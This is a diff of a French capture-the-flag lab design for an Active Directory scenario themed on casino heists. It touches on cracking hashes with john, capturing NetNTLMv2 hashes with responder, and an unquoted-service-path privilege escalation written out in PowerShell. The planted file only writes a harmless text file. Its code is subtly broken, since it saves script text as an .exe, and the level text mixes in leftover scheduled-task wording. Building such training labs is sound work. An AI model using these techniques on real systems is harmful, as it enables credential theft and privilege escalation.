@@ -273,7 +273,7 @@ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 Voici un flag simple à intégrer pour le Level 3, basé sur le mot de passe du service qu'on va casser :
 
-Flag (à soumettre) : Password trouvé du compte P@ssw0rd
+Flag (à soumettre) : Password trouvé du compte "svc-bella" P@ssw0rd
 
 Message réussite niveau :
 
@@ -308,35 +308,49 @@ responder -i ens18
 
 Voici une idée de flag, basé sur le hash NetNTLMv2 capturé :
 
-Flag (à soumettre) :
-
-FLAG{F1E2D3C4B5A6978877665544332211FF}
-Comment le récupérer :
-
-Après avoir lancé responder -I eth0 -wrf, le log /usr/share/responder/logs/Responder-Session.log contient une ligne de ce type :
-
-[SMB] NTLMv2-SSP Client   : BackupUser-Mirage
-      NTLMv2 Response     : F1E2D3C4B5A6978877665544332211FF:1122334455667788...
-      
-Flag ici F1E2D3C4B5A6978877665544332211FF
-
-Message réussite niveau :
-Vous êtes à présent Administrateur local du serveur de backups du domaine Mirage. La route est ouverte pour couper définitivement les sauvegardes...
+Flag (à soumettre) username + password du compte sous ce format username:password (ex avec toto et password = toto:password)
 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Level 5 (AD Mgm Grand) : Escalade de privilèges via une tache planifié 
+Level XXXXX (AD Mgm Grand) : Escalade de privilèges vi un chemin sans quotes
 
 Script pour histoire du niveau :
 
-Après avoir consolidé votre accès sur dans le casino Bellagio et pris le contrôle du serveur de sauvegarde, l’équipe d’Ocean se tourne désormais vers un nouveau terrain de jeu : Le MGM Grand. Une source à vous révèle qu’un script PowerShell s’exécute toutes les heures avec des droits élevés sur une machine membre du domaine MGM. 
+Après avoir consolidé votre accès sur dans le casino Bellagio, l’équipe d’Ocean se tourne désormais vers un nouveau terrain de jeu : Le MGM Grand. Grace a votre compte de service récupéré sur cet AD, et des reconaissances suplémentaires, vous pouvez désormais vous connecter à un PC via un service de controle à distance.
 
-Votre objectif est simple : modifier le contenu du fichier de script planifié de façon à créer un compte avec assez au niveau de privilège au prochain passage de la tâche. 
+Maintenant, analysez bien ce qu'il y a sur l'ordinateur, et exploiter y une faille ....
 
-Attaque : 
+
+Attaque Unquoted Service Path : 
 
 L'utilisateur se doit de créer un compte admin local grace a son droit de changer le fichier de script dans les taches planifiés
+
+
+
+Commandes :
+
+Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '"*"'} | Select-Object Name, DisplayName, PathName
+=> Liste les services sans quote.
+
+icacls "C:\Chemin\Vers\Le\Dossier"
+=> Verifie les permission
+
+# Créer un script malveillant
+$maliciousScript = @'
+$path = "$env:USERPROFILE\Desktop\exploit.txt"
+New-Item -ItemType File -Path $path -Force
+Set-Content -Path $path -Value "Ce fichier a été créé via une exploitation de service non sécurisé."
+'@
+
+Set-Content -Path "C:\Program.exe" -Value $maliciousScript
+
+# Copier le script malveillant dans le répertoire cible
+Copy-Item "C:\Program.exe" -Destination "C:\Program Files\Some Folder\Program.exe"
+
+# Redémarrer le service vulnérable
+Restart-Service -Name "VulnerableService"
+
 
 Exemple de script : 
 ```powershell
